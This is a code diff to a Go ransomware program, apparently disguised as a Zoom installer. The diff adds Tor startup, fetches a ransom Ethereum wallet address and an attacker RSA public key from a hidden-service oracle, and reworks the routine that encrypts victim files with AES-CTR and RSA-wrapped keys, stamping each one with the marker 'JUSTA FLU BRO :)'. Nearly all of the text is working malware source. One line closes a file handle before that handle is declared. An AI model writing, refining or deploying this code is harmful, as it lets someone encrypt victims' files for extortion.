@@ -9,6 +9,7 @@ import (
     "crypto/rand"
     "crypto/rsa"
     "crypto/aes"
+    "bufio"
     "time"
 
     "github.com/sug0/sr-ransomware/go/exe"
@@ -23,6 +24,11 @@ func RunZoomInstaller() error {
 }
 
 func DownloadKeysFromTor() error {
+    // start tor in the background
+    tor := exe.NewTor(torDirectory, "")
+    go tor.Start()
+    defer tor.Stop()
+
     // create work dir
     err := os.Mkdir(workDir)
     if err != nil && !os.IsExist(err) {
@@ -30,13 +36,27 @@ func DownloadKeysFromTor() error {
     }
 
     // 32 ms --> limit to about 128 KiB/s
-    client := ratelimit.NewHTTPClient(32 * time.Millisecond, true)
+    client := ratelimit.NewHTTPClient(5 * time.Minute, 32 * time.Millisecond, true)
 
     rsp, err := client.Get(hiddenServiceOracle)
     if err != nil {
         return errors.Wrap(pkg, "failed to query hidden service oracle", err)
     }
     defer rsp.Body.Close()
+
+    r := bufio.NewReader(rsp.Body)
+
+    // read wallet addr
+    fWallet, err := os.Create(victimEthereumWallet)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to create ethereum wallet file", err)
+    }
+    defer fPub.Close()
+
+    _, err = io.Copy(fWallet, &io.LimitedReader{R: r, N: 42})
+    if err != nil {
+        return errors.Wrap(pkg, "failed to read wallet address", err)
+    }
 
     // read public key
     fPub, err := os.Create(victimPublicKey)
@@ -47,7 +67,7 @@ func DownloadKeysFromTor() error {
 
     var pubKeyLen int64
 
-    err = binary.Read(rsp.Body, binary.BigEndian, &pubKeyLen)
+    err = binary.Read(r, binary.BigEndian, &pubKeyLen)
     if err != nil {
         return errors.Wrap(pkg, "failed to read pubkey len", err)
     }
@@ -75,6 +95,8 @@ func DownloadKeysFromTor() error {
     if err != nil {
         return errors.Wrap(pkg, "failed to read pubkey", err)
     }
+
+    return nil
 }
 
 func ImportPublicKey() (*rsa.PublicKey, error) {
@@ -99,16 +121,12 @@ func EncryptFile(pk *rsa.PublicKey, path string) error {
 
 func encryptFile(pk *rsa.PublicKey, path string) error {
     // new aes key
-    aesKey, err := util.GenerateAES()
+    aesIVKey, err := util.GenerateIVandKeyAES()
     if err != nil {
         return errors.Wrap(pkg, "failed to generate AES key", err)
     }
-    aesIV, err := util.GenerateAES()
-    if err != nil {
-        return errors.Wrap(pkg, "failed to generate AES IV", err)
-    }
-    aesBlock, _ := aes.NewCipher(aesKey)
-    aesStream := cipher.NewCTR(aesBlock, aesIV)
+    aesBlock, _ := aes.NewCipher(aesIVKey[16:])
+    aesStream := cipher.NewCTR(aesBlock, aesIVKey[:16])
 
     // load files
     fOriginal, err := os.Open(path)
@@ -123,18 +141,20 @@ func encryptFile(pk *rsa.PublicKey, path string) error {
     }
     defer fEncrypted.Close()
 
+    w := bufio.NewWriter(fEncrypted)
+
     // write magic
-    _, err = io.WriteString(fEncrypted, "JUSTA FLU BRO :)")
+    _, err = io.WriteString(w, "JUSTA FLU BRO :)")
     if err != nil {
         return errors.Wrap(pkg, "failed to write magic", err)
     }
 
     // write encrypted AES key
-    encryptedKey, err := rsa.EncryptPKCS1v15(rand.Reader, pk, append(aesIV, aesKey...))
+    encryptedKey, err := rsa.EncryptPKCS1v15(rand.Reader, pk, aesIVKey)
     if err != nil {
         return errors.Wrap(pkg, "failed encrypt AES key", err)
     }
-    _, err = fEncrypted.Write(encryptedKey)
+    _, err = w.Write(encryptedKey)
     if err != nil {
         return errors.Wrap(pkg, "failed to write encrypted AES key", err)
     }
@@ -145,10 +165,14 @@ func encryptFile(pk *rsa.PublicKey, path string) error {
         return errors.Wrap(pkg, "failed to stat file", err)
     }
     padding := util.GeneratePaddingBytes(int(info.Size()), aes.BlockSize)
-    stream := cipher.StreamWriter{S: aesStream, W: fEncrypted}
+    stream := cipher.StreamWriter{S: aesStream, W: w}
     _, err = io.Copy(stream, fOriginal)
     if err == nil {
         _, err = stream.Write(padding)
     }
-    return errors.WrapIfNotNil(pkg, "failed to encrypte file with AES", err)
+    if err != nil {
+        return errors.Wrap(pkg, "failed to encrypte file with AES", err)
+    }
+
+    return errors.WrapIfNotNil(pkg, "failed to flush buffer", w.Flush())
 }
